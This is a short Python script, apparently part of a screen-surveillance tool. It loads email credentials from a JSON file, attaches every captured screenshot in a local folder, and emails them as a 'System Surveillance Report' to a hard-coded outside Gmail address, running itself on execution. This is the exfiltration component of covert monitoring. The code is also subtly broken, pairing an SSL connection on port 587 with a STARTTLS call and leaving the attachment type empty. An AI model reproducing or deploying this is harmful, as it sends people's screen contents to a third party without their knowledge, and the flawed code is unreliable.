import smtplib
import ssl
import imghdr
from email.message import EmailMessage

import json
import os

def SendMail():
    f = open('email.json',) 
    data=json.load(f)
    EMAIL_ADDRESS = data["email"]
    EMAIL_PASSWORD =data["password"]

    #print(EMAIL_ADDRESS,EMAIL_PASSWORD)


    msg = EmailMessage()
    msg['Subject'] = 'System Surveillance Report'
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = 'testkey2024@gmail.com'

    msg.set_content('Report generated...')
    path = './screenshot/'
    for images in os.listdir(path):
        print(f'{images} sent ')
        with open(path+images,'rb') as file:
            file_data=file.read()
            file_type=imghdr.what(file.name)
            file_name=file.name
        msg.add_attachment(file_data,maintype='',subtype=file_type,filename=file_name)


    with smtplib.SMTP_SSL('smtp-mail.outlook.com',587) as smtp:
        smtp.starttls()
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)
# Sending Mail Calling the class Object
SendMail()